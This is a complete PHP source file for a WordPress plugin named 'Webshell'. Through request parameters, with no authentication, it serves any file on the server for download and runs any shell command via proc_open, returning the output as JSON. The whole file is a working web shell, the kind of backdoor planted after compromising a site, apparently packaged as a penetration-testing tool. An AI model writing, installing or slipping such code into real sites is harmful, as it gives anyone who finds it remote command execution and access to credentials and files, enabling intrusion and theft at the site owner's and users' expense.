<?php
/*:
Plugin Name: Webshell
Description: A webshell API for WordPress.
*/

$chunk_size = 1024;

if (isset($_REQUEST["action"])) {
    $action = $_REQUEST["action"];

    if ($action == "download") {
        $path_to_file = $_REQUEST["path"];
        if (file_exists($path_to_file)) {
            http_response_code(200);
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="'.basename($path_to_file).'"');
            header('Expires: 0');
            header('Cache-Control: must-revalidate');
            header('Pragma: public');
            header('Content-Length: '.filesize($path_to_file));
            flush();
            readfile($path_to_file);
            die();
        } else {
            http_response_code(404);
            header("Content-Type: application/json");
            echo json_encode(
                array(
                    "message" => "Path " . $path_to_file . " does not exist or is not readable.",
                    "path" => $path_to_file
                )
            );
        }
    } elseif ($action == "exec") {
        $command = $_REQUEST["cmd"];

        $descriptorspec = array(
            0 => array("pipe", "r"),  // stdin
            1 => array("pipe", "w"),  // stdout
            2 => array("pipe", "w")   // stderr
        );

        chdir("/");
        $process = proc_open($command, $descriptorspec, $pipes);

        if (!is_resource($process)) {
            // Can't spawn process
            exit(1);
        }

        $stdout = ""; $buffer = "";
        do {
            $buffer = fread($pipes[1], $chunk_size);
            $stdout = $stdout . $buffer;
        } while ((!feof($pipes[1])) && (strlen($buffer) != 0));

        $stderr = ""; $buffer = "";
        do {
            $buffer = fread($pipes[2], $chunk_size);
            $stderr = $stderr . $buffer;
        } while ((!feof($pipes[2])) && (strlen($buffer) != 0));

        fclose($pipes[1]);
        fclose($pipes[2]);
        proc_close($process);

        header('Content-Type: application/json');
        echo json_encode(
            array(
                'exec' => $command,
                'stdout' => $stdout,
                'stderr' => $stderr
            )
        );
    }
}
?>